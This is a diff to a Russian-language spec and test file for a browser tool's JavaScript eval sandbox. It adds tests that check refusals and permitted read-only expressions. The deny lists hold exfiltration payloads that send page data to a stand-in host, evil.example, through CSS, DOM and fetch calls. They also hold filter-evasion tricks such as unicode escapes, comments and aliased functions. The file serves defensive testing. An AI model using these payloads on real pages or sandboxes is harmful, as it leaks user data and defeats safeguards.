@@ -9,8 +9,10 @@
 - адрес (A): «\\», не-ASCII, %, [], @ в адресе, IP и порт — отказ; адреса нет в ответе /open или чтения, переход
   скриптом до чтения или во время eval, редирект на чужой сайт — about:blank и отказ;
 - согласие на чужой сайт (C1, C2): только окно вопросов (галочка доски — нет), хост вопроса целым токеном;
-- eval (E): побочные действия, навигация, вызов по чужому имени, доступ по строке, фоновые API, загрузка ресурса и
-  `new` вне списка (E6), правка формы (E7) — отказ, чтение — можно;
+- eval (E): вызов — только по списку разрешённого EVAL_CALLS (E7: setProperty, insertRule, setHTMLUnsafe и любой
+  другой вызов вне списка — отказ с его именем), побочные действия, навигация, вызов по чужому имени, доступ по
+  строке, фоновые API, `new` вне списка (E6), функция по ссылке и переназначение имени из списка (E8), прятки имени
+  вызова (E9: \\u, комментарий, тег шаблона, `?.(`, `)(`) — отказ; чтение и свойства без вызова — можно;
 - click, type, submit — отказ «вынесено в metis-0765» и в CLI (код 2), и в заявке прохода;
 - ящик (W): заявка из окна роли — в кэш окна (PANTHEON_TMP, у hq — XDG_CACHE_HOME собранного окна), вне окна —
   STATE/browser/queue; окно не из списка windows — отказ; вывод демона (O) — рядом с паролем, пароля нет в итогах;
@@ -293,18 +295,62 @@ DENY = {
     "[E7] ": ("document.forms[0].reset()", "document.querySelector('input[type=number]').stepUp(5)",
               "inp.stepDown()", "sel.add(document.createElement('option'))", "sel.add(new Option('a', 'b'))",
               "document.querySelector('dialog').requestClose()"),
+    # круг 3: пробы обоих argus (probe/evalp.py, probe_eval.py) — загрузка чужого адреса и правка DOM, стилей, формы
+    "[E7] ": ("document.body.style.setProperty('background-image', 'url(https://evil.example/?d=' + "
+              "encodeURIComponent(document.title) + ')')",
+              "document.styleSheets[0].insertRule('body{background:url(https://evil.example/?d=x)}', 0)",
+              "document.createRange().createContextualFragment('<img src=https://evil.example/?d=x>')",
+              "document.createElement('div').setHTMLUnsafe('<img src=https://evil.example/?d=x>')",
+              "document.body.setHTMLUnsafe('<img src=https://evil.example/?d=1>')",
+              "document.body.setHTML('<img src=https://evil.example/?d=1>')",
+              "document.body.animate([{backgroundImage: 'url(https://evil.example/?d=x)'}], 1000)",
+              "document.querySelector('link').relList.add('prefetch')", "document.body.classList.add('x')",
+              "document.querySelector('input').showPicker()", "document.querySelector('form').checkValidity()",
+              "document.querySelector('input').select()", "document.body.requestFullscreen()",
+              "document.adoptNode(document.querySelector('form'))",
+              "(r=>(r.selectNodeContents(document.body),r.deleteContents()))(document.createRange())",
+              "document.querySelector('a').classList.replace('a', 'b')", "[1].forEach(x => x)"),
+    "[E8] ": ("window.find('x')", "['https://evil.example/'].map(open)", "Array.from([1], open)",
+              "JSON.stringify({}, open)", "'a'.replace(/a/, alert)", "const Number = open; Number('x')",
+              "(Number => Number('x'))(open)", "({get: open}).get('x')", "'' + {toString: open}", "map(x => x)",
+              "stringify({})"),
+    "[E9] ": ("f\\u0065tch('https://evil.example/')", "new \\u0041udio('https://evil.example/')",
+              "document.\\u0063ookie", "open/**/('x')", "open // x\n('x')", "fetch`https://evil.example/`",
+              "x?.('a')", "(0, document.body.remove)()", "a[0]('x')", "`${open('x')}`"),
 }
 for mark, exprs in DENY.items():
     for expr in exprs:
         res = run(req("eval", url=AVITO, expr=expr))
-        check(f"{mark}eval «{expr}» — отказ", res["state"] == "refused" and "побочным" in res["why"], res)
+        check(f"{mark}eval «{expr}» — отказ", res["state"] == "refused" and "только чтение" in res["why"], res)
+for expr, name in (("document.body.style.setProperty('color', 'red')", "setProperty"),
+                   ("document.styleSheets[0].insertRule('a{}')", "insertRule"),
+                   ("document.body.animate([], 1)", "animate"), ("document.adoptNode(x)", "adoptNode")):
+    res = run(req("eval", url=AVITO, expr=expr))
+    check(f"[E7] отказ называет вызов: «вызов {name} нет в списке разрешённого (EVAL_CALLS)»",
+          f"вызов {name} нет в списке разрешённого (EVAL_CALLS)" in res.get("why", ""), res)
+for expr in ("Array.from(document.querySelectorAll('h2'), h => h.textContent.trim())",
+             "JSON.stringify([...document.links].slice(0, 5).map(a => a.href), null, 2)",
+             "(() => { const t = document.title; return t.toUpperCase(); })()", "getComputedStyle(document.body).color",
+             "document.querySelector('meta[name=description]')?.getAttribute('content')",
+             "[...document.querySelectorAll('li')].filter(li => li.innerText.includes('руб')).length",
+             "Object.keys(document.body.dataset).join(',')",
+             "parseInt(document.querySelector('.price').textContent.replace(/\\D/g, ''), 10)",
+             "`${document.title} — ${location.pathname}`", "[...document.links].map(String)",
+             "[...document.querySelectorAll('[data-marker=\"item\"]')].map(el => ({title: el.querySelector('h3')"
+             "?.innerText, price: el.querySelector('[itemprop=price]')?.getAttribute('content')}))",
+             "document.querySelector('details').toggle", "document.querySelector('video').load",
+             "document.querySelector('a').download", "document.querySelector('input[type=checkbox]').checked",
+             "document.body.style.backgroundImage"):
+    res = run(req("eval", url=AVITO, expr=expr))
+    check(f"[E7] eval «{expr}» — чтение по списку EVAL_CALLS или свойство без вызова, можно", res["state"] == "done",
+          res)
 for expr in ("[...document.querySelectorAll('a')].map(a => a.href)", "document.title === 'x'", "const n = 5; n",
              "a.length >= 2 && b.x != 3", "document.body.innerText.replace(/\\s+/g, ' ')",
              "document.querySelector('input[name=\"email\"]').value", "location.href", "location.pathname + location.search",
              "['h1', 'h2'].map(s => document.querySelector(s)?.innerText)", "document.forms[0].elements.length",
              "document.querySelector('[data-marker=\"item-price\"]').innerText",
              "new URL(location.href).searchParams.get('q')", "new URLSearchParams(location.search).get('a')",
-             "new Date().getTime()", "new Set([1, 2]).size", "new Map().size", "new RegExp('a').test('b')",
+             "new Date().toString()", "new Set([1, 2]).size", "new Map().size", "new RegExp('a').test('b')",
              "new Intl.NumberFormat('ru').format(5)", "document.querySelectorAll('.new-badge').length",
              "document.querySelector('[class*=\"new Audio\"]')", "item.renew"):
     res = run(req("eval", url=AVITO, expr=expr))
